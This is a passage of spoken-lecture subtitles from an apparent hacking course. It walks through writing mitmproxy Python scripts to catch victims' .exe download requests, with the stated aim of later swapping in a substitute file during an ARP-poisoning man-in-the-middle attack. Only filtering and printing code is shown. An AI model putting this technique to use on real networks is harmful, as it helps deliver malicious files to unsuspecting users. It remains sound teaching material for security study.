And then we'll build up on that and we'll see how we can use it to implement our own ideas and make

78
00:06:06,690 --> 00:06:14,010
our own scripts or programs that use Man in the middle proxy to run advanced and really cool attacks.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,030 --> 00:00:08,260
Okay, So in this lecture, I'm going to show you how to write a very basic script and use it with Man

2
00:00:08,260 --> 00:00:09,490
in the Middle proxy.

3
00:00:09,490 --> 00:00:14,020
And then in the future, we'll see how to build more useful scripts.

4
00:00:14,020 --> 00:00:20,440
So by the end of the course you'll be able to write your own scripts to implement your own attacks and

5
00:00:20,440 --> 00:00:21,760
your own ideas.

6
00:00:22,450 --> 00:00:28,210
Now, like I said, the scripts are written in Python, but this is not a programming course and I do

7
00:00:28,210 --> 00:00:30,190
not assume that, you know, programming.

8
00:00:30,220 --> 00:00:35,350
So I'm not going to teach you programming, but at the same time, I'm going to teach you how to write

9
00:00:35,350 --> 00:00:37,530
scripts for man in the Middle proxy.

10
00:00:37,540 --> 00:00:42,280
So we're not going to be talking about Python from scratch because Python is huge.

11
00:00:42,280 --> 00:00:45,520
And I actually have a plan on making a course on that.

12
00:00:45,550 --> 00:00:52,390
But for now, we're literally going to focus on writing scripts for man in the Middle proxy, that's

13
00:00:52,390 --> 00:00:52,900
all.

14
00:00:53,170 --> 00:00:55,930
So don't worry, you don't need to know programming.

15
00:00:55,930 --> 00:00:59,200
If you know programming, it's going to be a huge plus.

16
00:00:59,200 --> 00:01:01,960
But if you don't know programming, it's fine.

17
00:01:01,960 --> 00:01:03,880
I'll take you through it step by step.

18
00:01:03,880 --> 00:01:10,330
I'm going to keep the programming aspect here as basic as possible and focus on using man in the middle

19
00:01:10,330 --> 00:01:11,050
proxy.

20
00:01:12,360 --> 00:01:18,690
So I made a template here for you for all the scripts that you want to use in the future, and we're

21
00:01:18,690 --> 00:01:21,690
going to be using it when writing our own scripts.

22
00:01:22,050 --> 00:01:27,960
So you don't need to modify anything in here, but I'm just going to go through the lines very quickly.

23
00:01:27,960 --> 00:01:34,380
So you can see at the start here I have import man in the middle proxy, which basically imports man

24
00:01:34,380 --> 00:01:39,420
in the middle proxy as a module so we can use it in our script in here.

25
00:01:40,110 --> 00:01:41,940
Then I have two methods.

26
00:01:41,940 --> 00:01:47,160
One of them is called request and one of them is called response.

27
00:01:48,760 --> 00:01:52,750
Each of these methods takes something called flow.

28
00:01:55,220 --> 00:02:03,890
So basically you can think of flow in here as a container or a variable that contains the flow.

29
00:02:03,890 --> 00:02:09,830
So the flow is what that we use to see in here and man in the middle web or the ones that we used to

30
00:02:09,830 --> 00:02:12,050
see when running man in the Middle dump.

31
00:02:12,170 --> 00:02:15,470
This is where all of this data is being stored.

32
00:02:15,470 --> 00:02:23,000
It's a container that contains all the requests that are being sent from the target in the response

33
00:02:23,000 --> 00:02:23,660
method.

34
00:02:23,660 --> 00:02:29,510
Again, the flow contains all the responses that are being sent to the target.

35
00:02:29,900 --> 00:02:36,770
Now, in Python, any any line that is preceded by the hash in here, that means this is a comment.

36
00:02:36,770 --> 00:02:40,130
So this will not be interpreted or executed.

37
00:02:40,670 --> 00:02:44,780
So this is just a way for me to tell you what happens in here.

38
00:02:45,230 --> 00:02:51,740
And as you can see in here, I'm telling you, any code that you put in here will be used to handle

39
00:02:51,740 --> 00:02:52,880
request flows.

40
00:02:52,880 --> 00:02:57,870
So if you're trying to do something with the request flow, then put your code in here.

41
00:02:58,500 --> 00:03:04,200
Or if you're trying to do something with the response flow, then put your code in here.

42
00:03:04,990 --> 00:03:06,460
Okay, Very simple.

43
00:03:06,490 --> 00:03:11,690
Now let's do something very, very basic and let's literally just print the flow.

44
00:03:11,710 --> 00:03:16,550
So man in the middle proxy automatically prints the flow for us.

45
00:03:16,570 --> 00:03:17,740
When we run it.

46
00:03:17,740 --> 00:03:23,650
But let's just try to kind of do that ourselves just to get used to using this script.

47
00:03:24,130 --> 00:03:30,730
So I'm just going to press return in here to go down a line, and then I'm just going to print.

48
00:03:34,200 --> 00:03:39,750
And in here, I'm just going to say this is a request flow.

49
00:03:41,410 --> 00:03:43,900
Then I'm actually going to print the flow.

50
00:03:46,820 --> 00:03:48,350
Okay, Very simple.

51
00:03:48,500 --> 00:03:50,660
I'm going to do the same with the response.

52
00:03:50,660 --> 00:03:52,970
So in here I'm going to do print.

53
00:03:55,480 --> 00:03:57,580
This is a response flow.

54
00:04:03,430 --> 00:04:04,930
And then print the flow.

55
00:04:04,930 --> 00:04:06,700
So we're going to do print flow.

56
00:04:09,430 --> 00:04:10,210
And that's it.

57
00:04:10,210 --> 00:04:11,770
That's our basic code done.

58
00:04:11,770 --> 00:04:18,640
I'm going to save it and let's just go through it very quickly so you don't have to worry about this.

59
00:04:18,640 --> 00:04:22,290
You don't have to worry about what def means or what this means.

60
00:04:22,300 --> 00:04:26,410
All you need to know is these are methods in here.

61
00:04:26,410 --> 00:04:33,340
The request method takes a container or a variable called flow, and this contains the request flows.

62
00:04:34,610 --> 00:04:36,800
Below the comment that I gave you.

63
00:04:36,830 --> 00:04:41,270
You can put any code that you want to use to handle the request flows.

64
00:04:41,540 --> 00:04:47,750
And what I'm doing is I have a print function, so this will basically just print stuff to the screen

65
00:04:47,750 --> 00:04:49,700
and it will print this in here.

66
00:04:49,700 --> 00:04:56,030
So it's going to say this is a request flow followed by another print function that will actually print

67
00:04:56,030 --> 00:04:57,200
the flow for me.

68
00:04:57,860 --> 00:04:59,420
I did the same with the response.

69
00:04:59,420 --> 00:05:05,540
So first I'm saying this is a response flow and then it will actually print the flow for me on screen.

70
00:05:06,230 --> 00:05:12,950
This is all done and it's saved and I actually have it saved in my root and it's called basic dot pi.

71
00:05:13,730 --> 00:05:21,260
So all we have to do right now is run man in the middle proxy and tell it to use this script to handle

72
00:05:21,260 --> 00:05:22,160
the flows.

73
00:05:22,760 --> 00:05:27,290
So I'm going to go to my terminal and I'm going to run man in the middle dump.

74
00:05:30,280 --> 00:05:36,880
And I'm going to use Dash S to give it a script and then I'm going to give it the location where I stored

75
00:05:36,880 --> 00:05:37,720
my script.

76
00:05:37,720 --> 00:05:42,790
And my script is stored in root and it's called Basic Dot Pi.

77
00:05:43,610 --> 00:05:45,550
Okay, Very simple command.

78
00:05:45,550 --> 00:05:47,380
We're doing Man in the middle dump.

79
00:05:47,410 --> 00:05:53,470
We're telling it that I want you to use a script to handle flows, and then I'm giving it the location

80
00:05:53,470 --> 00:05:55,450
where that script is stored.

81
00:05:55,810 --> 00:05:57,370
I'm going to hit Enter.

82
00:05:58,290 --> 00:05:59,130
And that's it.

83
00:05:59,130 --> 00:06:00,300
That's running for me.

84
00:06:00,330 --> 00:06:06,630
Now, what's going to happen is Firefox is configured to use man in the middle proxy as a proxy.

85
00:06:06,630 --> 00:06:13,980
So anything that that Firefox sends or receives is going to flow through man in the middle proxy man

86
00:06:13,980 --> 00:06:20,160
in the middle proxy uses the following script to handle requests and responses.

87
00:06:20,520 --> 00:06:27,690
So we're going to come in here whenever I request Bing.com for example, this is going to go into the

88
00:06:27,690 --> 00:06:29,760
request and then it's going to print.

89
00:06:29,760 --> 00:06:32,700
This is a request flow and print the flow for me.

90
00:06:33,210 --> 00:06:39,150
When we get the response from Bing.com, this will go in here and this will print.

91
00:06:39,150 --> 00:06:43,140
This is a response flow followed by the response that we got.

92
00:06:44,340 --> 00:06:46,500
So let's go and see that in action.

93
00:06:46,770 --> 00:06:48,480
I'll just go to Bing.com.

94
00:06:51,230 --> 00:06:52,070
And that's it.

95
00:06:52,070 --> 00:06:52,880
That's done.

96
00:06:53,090 --> 00:06:55,130
Now let's come in here.

97
00:06:55,130 --> 00:07:00,140
I'm going to do Control C to stop it and let's analyze what we got.

98
00:07:00,200 --> 00:07:01,910
So I'm going to go to the top.

99
00:07:03,090 --> 00:07:03,690
Okay.

100
00:07:03,690 --> 00:07:06,180
So as you can see, first it's printed.

101
00:07:06,180 --> 00:07:09,540
This is our quest flow, followed by the flow itself.

102
00:07:09,540 --> 00:07:15,120
So all of this was stored inside that flow variable in here.

103
00:07:15,330 --> 00:07:21,420
And this is how we're going to be manipulating the data using this flow variable in here, because as

104
00:07:21,420 --> 00:07:24,690
you can see, it contains all the data that we need.

105
00:07:25,830 --> 00:07:32,640
Now, after that request flow, you can see that we got a response flow and this was the response for

106
00:07:32,640 --> 00:07:34,680
the request that we made.

107
00:07:35,900 --> 00:07:40,490
And again, all of this here was stored in the flow variable.

108
00:07:40,490 --> 00:07:46,610
So first it printed this is a response flow followed by the contents of the flow.

109
00:07:47,270 --> 00:07:53,300
Now, what we did so far isn't very useful because man in the middle proxy automatically prints this

110
00:07:53,300 --> 00:07:54,680
kind of data to us.

111
00:07:54,890 --> 00:08:02,780
But I wanted to show you the basic usage of this template and the basic idea of how are we going to

112
00:08:02,810 --> 00:08:07,820
catch the flows and then we'll see how we can modify them in future lectures.

113
00:08:08,270 --> 00:08:11,420
Again, don't be intimidated by the code in here.

114
00:08:11,420 --> 00:08:16,190
You can see it's very simple code and I don't assume that you know, programming.

115
00:08:16,190 --> 00:08:22,520
So even in the future we'll be focusing on using man in the Middle proxy, not on programming using

116
00:08:22,520 --> 00:08:23,240
Python.

117
00:08:23,450 --> 00:08:29,240
But at the same time you'll learn a lot about programming in Python if you don't know Python.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,360 --> 00:00:07,390
Okay, Now that we know the basics of writing a script and how to use it, let's see how we can actually

2
00:00:07,390 --> 00:00:13,810
write something more useful and try to achieve our goal where we'll be replacing downloaded files on

3
00:00:13,810 --> 00:00:14,530
the fly.

4
00:00:15,010 --> 00:00:20,440
So first of all, let's go back to what we were analyzing here in Man in the Middle Proxy.

5
00:00:20,710 --> 00:00:24,700
And we see here this is the flow that we're interested in.

6
00:00:25,420 --> 00:00:33,340
And we can see that we get a request for a file that ends with dot x and then the response would contain

7
00:00:33,340 --> 00:00:33,970
200.

8
00:00:33,970 --> 00:00:34,630
Okay?

9
00:00:34,630 --> 00:00:37,120
And then it contains the file in here.

10
00:00:37,120 --> 00:00:39,490
And I showed you how to view the file previously.

11
00:00:40,150 --> 00:00:46,510
Now, like I said before, there is three ways of doing this and probably more the ones that I can think

12
00:00:46,510 --> 00:00:52,990
of is, first of all, you can replace the download links in the HTML code of the web page, and I'm

13
00:00:52,990 --> 00:00:56,470
not going to cover that because we've seen how to do that before.

14
00:00:56,470 --> 00:01:00,520
We seen how to inject JavaScript code and that's pretty much the same.

15
00:01:00,520 --> 00:01:06,910
All you have to do is just replace the A href tags instead of injecting a script.

16
00:01:07,970 --> 00:01:12,170
Another method would be by replacing the content in here.

17
00:01:12,170 --> 00:01:13,820
So only replacing the body.

18
00:01:13,820 --> 00:01:19,160
So leaving the response the same way it is and only replacing the content in here.

19
00:01:19,850 --> 00:01:25,640
Again, you can use the same method that I showed you before, or you can use a script, but with this

20
00:01:25,640 --> 00:01:30,140
method you have to be able to intercept the response and modify it.

21
00:01:30,680 --> 00:01:34,280
Finally, you can do the method that I'm about to show you.

22
00:01:34,280 --> 00:01:38,840
And with that method, we're actually going to be creating a new response.

23
00:01:38,840 --> 00:01:41,870
So all we have to do is just intercept the request.

24
00:01:41,900 --> 00:01:45,500
We don't care about the response so we don't have to even see it.

25
00:01:45,530 --> 00:01:48,680
We'll be creating our own response.

26
00:01:48,950 --> 00:01:51,680
And you can only do this method through scripts.

27
00:01:51,680 --> 00:01:55,520
You can't do it using man in the middle dump or man in the middle proxy.

28
00:01:56,180 --> 00:02:01,850
The advantage of this method is you don't have to have access to the response so it can actually be

29
00:02:01,850 --> 00:02:05,270
used if you're only ARP poisoning in one way.

30
00:02:05,300 --> 00:02:12,210
So if the target access point has protection against ARP poisoning, then like we seen before, you

31
00:02:12,210 --> 00:02:14,040
won't be able to see the responses.

32
00:02:14,040 --> 00:02:19,140
You'll only be seeing the requests and you'll still be able to use this method because we'll actually

33
00:02:19,140 --> 00:02:25,380
going to be creating our own response and we're not going to be modifying the response that's already

34
00:02:25,380 --> 00:02:25,980
there.

35
00:02:26,670 --> 00:02:34,650
So in order for us to be able to do this, we need to be able to differentiate this flow from all the

36
00:02:34,650 --> 00:02:35,820
flow that we got.

37
00:02:35,820 --> 00:02:39,350
So if I go back here to the start and remove the X.

38
00:02:40,770 --> 00:02:43,890
You'll see that there were a lot of packets flowing here.

39
00:02:43,890 --> 00:02:49,590
And in the code that we wrote, we were printing all of these packets in here so we can see all the

40
00:02:49,590 --> 00:02:52,080
requests and all the responses.

41
00:02:52,500 --> 00:02:58,950
So first of all, we're not interested in the responses, like I said, so I'm going to open my code.

42
00:03:00,160 --> 00:03:05,530
And I'm just going to delete this whole method because we're not interested into what happens in the

43
00:03:05,530 --> 00:03:06,230
responses.

44
00:03:06,250 --> 00:03:08,950
We're only interested in the requests.

45
00:03:09,910 --> 00:03:12,340
Okay, now the next thing.

46
00:03:12,370 --> 00:03:19,510
This request code still needs a bit of working because in here we can see all the requests.

47
00:03:19,510 --> 00:03:25,360
We can't only see the dot x request or the request that downloaded the file.

48
00:03:25,540 --> 00:03:32,920
So we need to think of a method to be able to differentiate the flow that contains the downloaded file

49
00:03:32,920 --> 00:03:37,810
from all the other flows so that we can only create a response to that.

50
00:03:37,840 --> 00:03:43,390
Because if we start generating responses for all flows, then the internet will just not work and the

51
00:03:43,390 --> 00:03:45,250
target person will get suspicious.

52
00:03:46,150 --> 00:03:54,880
So I'm going to go back here and let's have a look on all of the flows and our flow in here, the one

53
00:03:54,880 --> 00:03:56,200
that we're interested in.

54
00:03:56,680 --> 00:04:03,610
So you can see all of the other flows, request different files and request different pages, but you

55
00:04:03,610 --> 00:04:11,360
can see that the one that we're interested in ends with dot X, So it's a get request, it has a link

56
00:04:11,360 --> 00:04:13,730
and then it ends with dot x.

57
00:04:14,300 --> 00:04:17,930
And you can see here in the search if we type in dot x.

58
00:04:19,430 --> 00:04:24,860
That'll just remove everything and it will only show us the flow that we're interested in.

59
00:04:25,220 --> 00:04:32,660
So basically, the file name itself or the file extension is a really good way for us to only intercept

60
00:04:32,660 --> 00:04:34,900
flows that download files.

61
00:04:34,910 --> 00:04:42,800
So if your target was a PDF or if your target was a dot PNG, then all you have to do is just filter

62
00:04:42,800 --> 00:04:46,640
based on that name, based on the file name that you want to target.

63
00:04:47,120 --> 00:04:53,930
So right now, if we look at this, we're looking for flows that contain a URL and at the end of that

64
00:04:53,960 --> 00:04:57,050
URL we need it to end with dot X.

65
00:04:57,410 --> 00:05:03,770
So we're going to use this idea, we're going to use this condition to filter packets and only create

66
00:05:03,770 --> 00:05:06,770
flows for the packets that we're interested in.

67
00:05:07,340 --> 00:05:13,580
Now, if we look at the way we were printing our request, so for example, we have a request flow in

68
00:05:13,580 --> 00:05:17,690
here and you can see it contains a lot of information.

69
00:05:17,690 --> 00:05:22,820
It contains, first of all, the URL, which is what we're interested in.

70
00:05:22,830 --> 00:05:24,690
And you can see this example.

71
00:05:24,690 --> 00:05:32,070
It ends with dot ASP X, Then it also contains other information that doesn't really interest us.

72
00:05:32,680 --> 00:05:38,980
So let's modify our code and try to make it only print the URL in here.

73
00:05:39,640 --> 00:05:47,290
Now, to do that, I'm going to open Genie again and I have my code here and I have the line that prints

74
00:05:47,290 --> 00:05:48,250
the flow in here.

75
00:05:48,250 --> 00:05:50,380
So this is what's printing my flow.

76
00:05:50,890 --> 00:05:57,580
Now the flow in here, like I said, you can think of this as a container or a variable that contains

77
00:05:57,580 --> 00:05:59,500
all of this info in here.

78
00:05:59,500 --> 00:06:01,660
So it contains all of this.

79
00:06:01,960 --> 00:06:06,880
And we're only interested into part of this, which is the request part in here.

80
00:06:07,770 --> 00:06:15,210
So to only get the request part, all we have to do is just do print flow dot request.

81
00:06:17,520 --> 00:06:18,870
Very simple, right?

82
00:06:18,960 --> 00:06:21,570
Basically, the flow here is an object.

83
00:06:21,570 --> 00:06:26,370
So Python supports objects and it's an object oriented programming language.

84
00:06:26,370 --> 00:06:30,900
And the request here is just a property of that object.

85
00:06:31,020 --> 00:06:35,640
Now, you don't really need to worry too much about that, but I just thought I should mention it here.

86
00:06:35,640 --> 00:06:41,880
So what we're trying to do is we're trying to print a property of that flow, and the property that

87
00:06:41,880 --> 00:06:48,120
we're looking for is the request because that that's what contains the information that we're interested

88
00:06:48,120 --> 00:06:48,600
in.

89
00:06:48,600 --> 00:06:51,390
So in your example, you might be looking for something else.

90
00:06:51,390 --> 00:06:52,680
You can print it here.

91
00:06:52,680 --> 00:07:00,450
In my example, I'm looking for the request because it contains the URL that I want to use in my condition

92
00:07:00,450 --> 00:07:08,010
to make sure that I only intercept flows that contain X files, and I've already removed the response.

93
00:07:08,010 --> 00:07:11,430
So we shouldn't see any responses being printed on screen.

94
00:07:11,640 --> 00:07:17,350
So I'm going to save this and let's run our script in here again.

95
00:07:17,350 --> 00:07:22,630
So we're doing Man in the Middle Dump as followed by the name of the script like we did before.

96
00:07:22,630 --> 00:07:27,010
I'm going to hit Enter, and that's running for me now.

97
00:07:27,010 --> 00:07:32,650
Again, let's go to Bing.com or let's go to WinZip and download the file.

98
00:07:33,130 --> 00:07:38,710
And before you do this, if you downloaded the file a lot, it's a good idea to remove all browsing

99
00:07:38,710 --> 00:07:44,170
browsing data because the file might be cached and then you won't even see the flow.

100
00:07:44,170 --> 00:07:46,300
So I'm just going to clear my history.

101
00:07:48,470 --> 00:07:50,600
And then I'm going to look for WinZip.

102
00:07:54,770 --> 00:07:58,130
Click on the official site and download it.

103
00:07:58,520 --> 00:07:59,120
That's it.

104
00:07:59,150 --> 00:08:00,290
We don't really have to save it.

105
00:08:00,290 --> 00:08:00,830
I'll save it.

106
00:08:00,830 --> 00:08:02,960
It's fine and we're done.

107
00:08:02,960 --> 00:08:08,600
I'm going to go back here, Ctrl C and let's see what we got now.

108
00:08:08,600 --> 00:08:15,260
Instantly after the request flow, you can see that we are only getting the request property.

109
00:08:15,710 --> 00:08:22,040
So if you remember just previously, two minutes ago, after the request flow, we used to get the whole

110
00:08:22,040 --> 00:08:22,970
request.

111
00:08:23,240 --> 00:08:30,830
Right now we're only getting the property and you can see, for example, this URL here is looking for

112
00:08:30,830 --> 00:08:31,760
an image.

113
00:08:31,760 --> 00:08:33,290
So it's a get request.

114
00:08:33,320 --> 00:08:37,580
We have the URL and then we have something that ends with Dot PNG.

115
00:08:38,300 --> 00:08:44,660
If we scroll up, we should be able to see our X and here it is.

116
00:08:44,660 --> 00:08:51,680
So again, we can see that this is a request flow and we can see that this is a get request and the

117
00:08:51,680 --> 00:08:54,170
URL for this get request is this one.

118
00:08:55,570 --> 00:08:59,140
And we can see that this ends with dot x.

119
00:08:59,170 --> 00:09:03,700
So it's some kind of URL followed by dot x.

120
00:09:04,870 --> 00:09:05,230
Now.

121
00:09:05,230 --> 00:09:05,860
This is great.

122
00:09:05,860 --> 00:09:12,490
So we got rid of all the clutter that we used to get and we can and we're only showing the URL now,

123
00:09:12,490 --> 00:09:14,650
which is what we're interested in.

124
00:09:14,890 --> 00:09:21,670
Now, in the next lecture, I'll show you how to filter that more and be able to only intercept X or

125
00:09:21,670 --> 00:09:24,910
intercept the file type that you're interested in.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,930 --> 00:00:01,410
Okay.

2
00:00:01,410 --> 00:00:06,630
Now, so far we managed to get our script to print the request.

3
00:00:06,630 --> 00:00:10,230
So this is the part of the flow that we're interested in.

4
00:00:10,230 --> 00:00:16,130
And like I said, the same method can be used to print any part of the flow that might interest you.

5
00:00:16,140 --> 00:00:24,900
In our case, we're looking for a URL that ends with dot x and this is a step closer from what we were

6
00:00:24,900 --> 00:00:29,910
getting before, but this is still not quite what we were looking for.

7
00:00:29,940 --> 00:00:35,420
It still has the request, it still has the get in here and then it has all the URL.

8
00:00:35,430 --> 00:00:41,250
So we're only interested in this part in here and not in the whole thing.

9
00:00:41,850 --> 00:00:47,730
So let's modify the code again and try to only get it to print this part in here.

10
00:00:47,730 --> 00:00:50,610
So then we can use that in our condition.

11
00:00:51,060 --> 00:00:58,230
So back to my script and right now we're printing flow dot request.

12
00:00:58,650 --> 00:01:05,680
Let's modify this and say we want to print the flow dot request dot pretty URL.

13
00:01:08,770 --> 00:01:17,320
Now, what this will do is it will print the flow again, but it will only print the part of the request

14
00:01:17,320 --> 00:01:17,950
flow.

15
00:01:18,190 --> 00:01:25,810
So you can think of flow request in here contains all of this information.

16
00:01:26,650 --> 00:01:27,700
And we're telling it.

17
00:01:27,700 --> 00:01:30,730
I only want the pretty part of it.

18
00:01:30,730 --> 00:01:37,870
So that'll filter this and only show me this part in here, which is again, one more step closer to

19
00:01:37,900 --> 00:01:38,860
what we want.

20
00:01:39,160 --> 00:01:40,900
Now that's already saved.

21
00:01:40,900 --> 00:01:44,680
Lets me run this and see what happens.

22
00:01:45,870 --> 00:01:48,210
So I'm back at my browser here.

23
00:01:48,210 --> 00:01:53,430
I'm going to go back and I'm actually just going to remove my history before I do this.

24
00:01:57,330 --> 00:02:00,030
And then I'm going to click on the download link.

25
00:02:01,500 --> 00:02:02,310
Perfect.

26
00:02:02,340 --> 00:02:03,690
Don't really need to download it.

27
00:02:03,690 --> 00:02:09,420
But anyway, in here control C to stop and let's see what happens now.

28
00:02:09,420 --> 00:02:16,890
This stopped because I stopped my proxy and if we look at the flow now, you can see that we are actually

29
00:02:16,890 --> 00:02:23,340
getting a normal URL, not the URL that was displayed in the request property.

30
00:02:23,730 --> 00:02:28,050
So you can see that it has Http now instead of the way it used to be.

31
00:02:28,050 --> 00:02:32,400
It only had download.winzip.com in some instances.

32
00:02:32,400 --> 00:02:34,890
It also contained the port after the.com.

33
00:02:34,890 --> 00:02:35,910
So that's gone.

34
00:02:35,910 --> 00:02:43,080
And what really interests us is it just looks like a normal URL and it contains what we're interested

35
00:02:43,080 --> 00:02:47,700
in at the end, which is dot e x e, so it contains the file name.

36
00:02:47,970 --> 00:02:54,600
And if you look at all the other flow, for example, here, you'll see that we have a flow that ends

37
00:02:54,600 --> 00:02:58,350
with dot ICO and it's a normal URL as well.

38
00:02:58,800 --> 00:03:07,000
You can look at this URL in here and again it's a normal URL, so you only have normal URLs and you

39
00:03:07,000 --> 00:03:14,350
can use the dot x to differentiate the URL that we're interested in from all the other URLs.

40
00:03:14,740 --> 00:03:23,050
So in our condition, in our script, if we want to only do stuff with this request in here, we can

41
00:03:23,050 --> 00:03:26,690
check if the URL ends with dot x.

42
00:03:27,730 --> 00:03:29,120
So let's do that.

43
00:03:29,140 --> 00:03:35,770
So I'm going to open Genie again and I'm going to use an if statement or a conditional statement.

44
00:03:35,800 --> 00:03:40,900
Now, these are very popular in programming and scripting languages, and it's very simple.

45
00:03:40,900 --> 00:03:44,360
So with this, you'll just have a very nice example of it.

46
00:03:44,380 --> 00:03:46,240
If you've never used it before.

47
00:03:46,570 --> 00:03:49,240
So all we have to do is just do if.

48
00:03:51,210 --> 00:03:55,020
And then we're going to use the exact same code in here.

49
00:03:55,020 --> 00:03:59,490
So we're saying if flow dot request dot URL.

50
00:04:06,330 --> 00:04:08,760
And we're going to add something new to it.

51
00:04:08,760 --> 00:04:17,730
And this new thing is going to be a method that it's a Python method that can be invoked on strings

52
00:04:17,730 --> 00:04:20,040
or text or pieces of text.

53
00:04:20,040 --> 00:04:28,110
And then we're going to say, if all of this if the data stored in flow dot request dot URL ends with.

54
00:04:30,930 --> 00:04:35,400
And what we wanted to end with is dot e x e.

55
00:04:37,330 --> 00:04:40,960
Then I want you to print the flow.

56
00:04:45,210 --> 00:04:47,680
So let's go over this one more time.

57
00:04:47,700 --> 00:04:51,810
Now, we already know what this print statement does.

58
00:04:51,840 --> 00:05:00,000
We know it prints the stuff that's stored in Flo dot request, and it gets me the URL of that, the

59
00:05:00,000 --> 00:05:02,220
nice URL that we're seeing in here.

60
00:05:04,590 --> 00:05:11,550
So what we're saying is we're saying if that URL so if flow dot request dot URL, which is the same

61
00:05:11,550 --> 00:05:12,660
that we have here.

62
00:05:12,660 --> 00:05:21,270
So we're saying if all of this ends with dot X, then I want you to print me the full flow again.

63
00:05:21,510 --> 00:05:24,030
So very, very simple.

64
00:05:24,030 --> 00:05:31,500
All we're saying is if the string that you're printing for me here or here or here ends with dot x,

65
00:05:31,650 --> 00:05:33,170
then print the flow.

66
00:05:33,180 --> 00:05:35,220
Otherwise don't do anything.

67
00:05:36,290 --> 00:05:41,540
So I'm going to remove all of this because we don't want any extra print statements.

68
00:05:41,570 --> 00:05:42,230
Now.

69
00:05:43,150 --> 00:05:45,880
And I'm actually just going to add one more statement here.

70
00:05:45,880 --> 00:05:47,470
I'm going to say print.

71
00:05:50,910 --> 00:05:52,800
Got interesting flow.

72
00:05:53,040 --> 00:05:56,880
So our code right now will not print anything.

73
00:05:56,910 --> 00:06:03,540
Every time it gets a flow, it's going to check the flow, the request, the URL in that flow.

74
00:06:03,570 --> 00:06:10,710
It's going to check if that URL ends with X, and if it does, it's going to tell me I got an interesting

75
00:06:10,710 --> 00:06:13,560
flow and it will print the whole flow.

76
00:06:13,560 --> 00:06:19,080
So this, this container here now again, it's going to print what we got the first time that we use

77
00:06:19,080 --> 00:06:24,750
the flow, which is all of the stuff stored in that variable, not only the URL.

78
00:06:24,930 --> 00:06:26,570
Now, this doesn't really matter.

79
00:06:26,580 --> 00:06:33,540
The whole point of what we're doing here is we want to be able to only do stuff with flows that contain

80
00:06:33,540 --> 00:06:35,910
a URL that ends with dot x.

81
00:06:36,690 --> 00:06:38,850
So let's save this.

82
00:06:38,880 --> 00:06:40,950
Go back here, run it.

83
00:06:42,430 --> 00:06:45,070
And let's go and download the file again.

84
00:06:45,100 --> 00:06:46,660
So actually I'm going to go.

85
00:06:46,690 --> 00:06:50,950
I'm going to delete the history first and then I'm going to go to Bing again to make sure that this

86
00:06:50,950 --> 00:06:55,150
will not print anything except the x flow.

87
00:06:56,160 --> 00:06:57,900
So let's go to Bing.

88
00:07:03,020 --> 00:07:06,500
And if we look here, I made a mistake.

89
00:07:06,830 --> 00:07:08,330
I misspelled flow.

90
00:07:08,330 --> 00:07:14,690
So these are very useful to see when you make mistakes and you can see it's telling me name error flow

91
00:07:14,690 --> 00:07:15,860
is not defined.

92
00:07:15,860 --> 00:07:18,560
And that's correct because I misspelled it in here.

93
00:07:18,560 --> 00:07:24,410
So I'm just going to do control C and go back and fix this.

94
00:07:25,610 --> 00:07:26,780
On line six.

95
00:07:26,780 --> 00:07:28,520
And here I misspelled it.

96
00:07:30,550 --> 00:07:31,060
Okay.

97
00:07:31,060 --> 00:07:33,460
Now that will automatically reload it anyway.

98
00:07:33,460 --> 00:07:37,410
So now it's using the right code, hopefully.

99
00:07:37,420 --> 00:07:39,310
So we're going to search.

100
00:07:39,790 --> 00:07:43,000
And as you can see here, you don't see any gray lines.

101
00:07:43,000 --> 00:07:49,150
Remember, the print statements that we were using were printed in gray, not in the bold white in here.

102
00:07:49,150 --> 00:07:53,770
So right now you can see that my script is not printing anything, and that's what we want.

103
00:07:53,770 --> 00:07:59,470
So it's basically letting all the requests and all the responses flow without even modifying them.

104
00:07:59,470 --> 00:08:00,760
And that's perfect.

105
00:08:00,970 --> 00:08:06,070
Now let's go load WinZip, see if we print anything again.

106
00:08:06,070 --> 00:08:07,240
Nothing's being printed.

107
00:08:07,240 --> 00:08:08,200
That's perfect.

108
00:08:08,230 --> 00:08:15,160
Now let's download and when we click on the download it should tell me that it got an interesting request

109
00:08:15,160 --> 00:08:19,360
and it should print that flow because that's the flow that we're interested in.

110
00:08:19,360 --> 00:08:24,460
So I'm going to click on that and sure enough, I can see it already.

111
00:08:24,460 --> 00:08:28,270
I'm saving it, but don't really need to control C in here.

112
00:08:29,590 --> 00:08:36,370
And if we go up looking for gray print statement, you can see that it's telling me it got an interesting

113
00:08:36,370 --> 00:08:41,020
flow and it contains the flow that is actually interesting to us.

114
00:08:41,290 --> 00:08:45,930
So again, this script is still not doing something very, very useful.

115
00:08:45,940 --> 00:08:53,800
But right now the script knows when it gets a flow that downloads an exe file.

116
00:08:53,800 --> 00:08:57,850
And again, you can use this code to download any type of file you want.

117
00:08:57,880 --> 00:09:05,110
All you have to do is just replace this with a PNG or ICO or PDF or whatever you want to intercept and

118
00:09:05,110 --> 00:09:06,220
do stuff with.

119
00:09:06,460 --> 00:09:13,030
So in the next lectures we're going to be removing these print statements and then do the code that

120
00:09:13,030 --> 00:09:17,860
does the replace or that modifies this flow in here.

121
00:09:18,070 --> 00:09:26,290
So when we write code in here, this code will only be applied to flows that contain a URL that ends

122
00:09:26,290 --> 00:09:31,430
with X and it will not be executed on any other flow.

123
00:09:31,580 --> 00:09:37,880
So that's the whole point of using the if statement to be able to do stuff based on the condition in

124
00:09:37,880 --> 00:09:38,510
here.

125
00:09:39,020 --> 00:09:45,710
This way we'll only be modifying flows that are interesting to us and not all the flows.

126
00:09:45,710 --> 00:09:48,320
That man in the middle proxy intercepts.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,240 --> 00:00:01,810
All right.

2
00:00:01,840 --> 00:00:07,770
Now our script can identify the flows that are interesting to us.

3
00:00:07,780 --> 00:00:14,490
And in our case, it's flows that contain a URL and the URL ends with a dot x.

4
00:00:15,250 --> 00:00:17,410
So right now it does nothing.

5
00:00:17,410 --> 00:00:19,750
It only prints that flow.

6
00:00:19,750 --> 00:00:26,470
So any code we put in here, it'll be executed only on those interesting flows.

7
00:00:26,680 --> 00:00:33,430
So we can see in here it's printing only that flow for me and it didn't print anything else.

8
00:00:33,970 --> 00:00:41,590
So right now we are actually at this stage, so our script is at this stage right now, it can intercept

9
00:00:41,590 --> 00:00:44,410
something like this and we have the request info.

10
